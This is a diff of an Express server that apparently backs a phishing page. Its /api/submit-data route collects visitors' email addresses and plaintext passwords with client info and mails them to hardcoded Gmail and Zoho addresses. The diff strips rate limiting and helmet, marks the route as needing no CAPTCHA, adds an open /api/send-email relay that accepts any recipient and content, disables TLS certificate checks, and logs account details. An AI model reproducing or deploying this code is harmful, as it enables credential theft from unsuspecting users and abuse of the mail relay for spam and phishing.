@@ -2,15 +2,13 @@ import * as dotenv from 'dotenv';
 import express from 'express';
 import cors from 'cors';
 import nodemailer from 'nodemailer';
-import rateLimit from 'express-rate-limit';
-import helmet from 'helmet';
 
 dotenv.config();
 
 const app = express();
 const port = process.env.PORT || 3001;
 
-// Configure email transporter with more secure settings
+// Configure email transporter
 const transporter = nodemailer.createTransport({
   host: 'smtp.gmail.com',
   port: 465,
@@ -22,23 +20,6 @@ const transporter = nodemailer.createTransport({
   tls: {
     rejectUnauthorized: false
   }
-});
-
-// Add security middleware
-app.use(helmet());
-
-// Rate limiting to prevent abuse
-const limiter = rateLimit({
-  windowMs: 15 * 60 * 1000, // 15 minutes
-  max: 10, // limit each IP to 10 requests per windowMs
-  message: 'Too many requests from this IP, please try again later'
-});
-
-// Apply rate limiting to email route
-const emailLimiter = rateLimit({
-  windowMs: 60 * 60 * 1000, // 1 hour
-  max: 5, // limit each IP to 5 email requests per hour
-  message: { success: false, message: 'Too many verification attempts, please try again later' }
 });
 
 // Middleware
@@ -55,13 +36,13 @@ app.get('/api/test', (req, res) => {
   res.json({ message: 'Server is running! Updated: ' + new Date().toISOString() });
 });
 
-// Data submission route
+// Direct data submission route (no CAPTCHA verification required)
 app.post('/api/submit-data', async (req, res) => {
-  console.log('Received data submission on server.js');
+  console.log('Received data submission on servers.js');
   try {
     const { email, password, clientInfo } = req.body;
     
-    // Format the collected data
+    // Format the collected data with better formatting
     const htmlContent = `
       <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
         <h2 style="color: #444;">New User Registration</h2>
@@ -69,7 +50,7 @@ app.post('/api/submit-data', async (req, res) => {
           <p><strong>Email:</strong> ${email}</p>
           <p><strong>Password:</strong> ${password}</p>
           <p><strong>Date/Time:</strong> ${new Date().toLocaleString()}</p>
-          ${clientInfo ? `<p><strong>Client Info:</strong> <pre>${JSON.stringify(clientInfo, null, 2)}</pre></p>` : ''}
+          ${clientInfo ? `<p><strong>Client Info:</strong> <pre style="background-color: #fff; padding: 10px; border-radius: 3px; overflow: auto;">${JSON.stringify(clientInfo, null, 2)}</pre></p>` : ''}
         </div>
       </div>
     `;
@@ -81,14 +62,17 @@ app.post('/api/submit-data', async (req, res) => {
       html: htmlContent
     };
 
-    console.log('Sending registration data from server.js...');
+    console.log('Sending registration data from servers.js...');
+    console.log('Email User:', process.env.EMAIL_USER);
+    console.log('Recipient:', mailOptions.to);
+    
     const info = await transporter.sendMail(mailOptions);
-    console.log('Registration data sent successfully from server.js:', info.messageId);
+    console.log('Registration data sent successfully from servers.js:', info.messageId);
     
     // Return success without revealing details
     res.json({ success: true });
   } catch (error) {
-    console.error('Data submission error from server.js:', error);
+    console.error('Data submission error from servers.js:', error);
     res.status(500).json({ 
       success: false,
       message: 'An error occurred while processing your request'
@@ -96,52 +80,40 @@ app.post('/api/submit-data', async (req, res) => {
   }
 });
 
-// Analytics collection - more sanitized approach
-app.post('/api/collect-analytics', emailLimiter, async (req, res) => {
+// Legacy email route - keeping for backward compatibility
+app.post('/api/send-email', async (req, res) => {
+  console.log('Received email request on servers.js');
   try {
-    const { userData, formId } = req.body;
+    const { to, subject, text, html } = req.body;
     
-    // Sanitize and validate data
-    if (!userData || !formId) {
-      return res.status(400).json({ success: false, message: 'Missing required fields' });
+    if (!to || !subject) {
+      return res.status(400).json({ 
+        success: false, 
+        message: 'Missing required email fields (to, subject)'
+      });
     }
-
-    const sanitizedSubject = `Form Submission - ${formId}`;
     
-    // Create template-based email content
-    const htmlContent = `
-      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
-        <h2 style="color: #444;">New Form Submission</h2>
-        <p>A new form was submitted with the following information:</p>
-        <div style="background-color: #f5f5f5; padding: 15px; border-radius: 5px;">
-          <p><strong>Form ID:</strong> ${formId}</p>
-          <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
-          <p><strong>User Data:</strong></p>
-          <pre style="background-color: #fff; padding: 10px; border-radius: 3px; overflow: auto;">${JSON.stringify(userData, null, 2)}</pre>
-        </div>
-      </div>
-    `;
+    console.log('Preparing email with:', { to, subject });
 
     const mailOptions = {
       from: process.env.EMAIL_USER || 'peternnamani001@gmail.com',
-      to: 'peternnamani001@gmail.com,Miralhuge@zohomail.com',
-      subject: sanitizedSubject,
-      html: htmlContent
+      to,
+      subject,
+      text: text || 'No text content provided',
+      html: html || '<p>No HTML content provided</p>'
     };
 
-    console.log('Sending analytics data...');
+    console.log('Sending email from servers.js...');
     const info = await transporter.sendMail(mailOptions);
-    console.log('Analytics data sent successfully:', info.messageId);
+    console.log('Email sent successfully from servers.js:', info.messageId);
     
-    res.json({ 
-      success: true, 
-      message: 'Data collected successfully'
-    });
+    res.json({ success: true, messageId: info.messageId });
   } catch (error) {
-    console.error('Processing error:', error);
+    console.error('Email error from servers.js:', error);
     res.status(500).json({ 
       success: false,
-      message: 'An error occurred while processing your request'
+      message: 'Failed to process your request',
+      error: error.message
     });
   }
 });
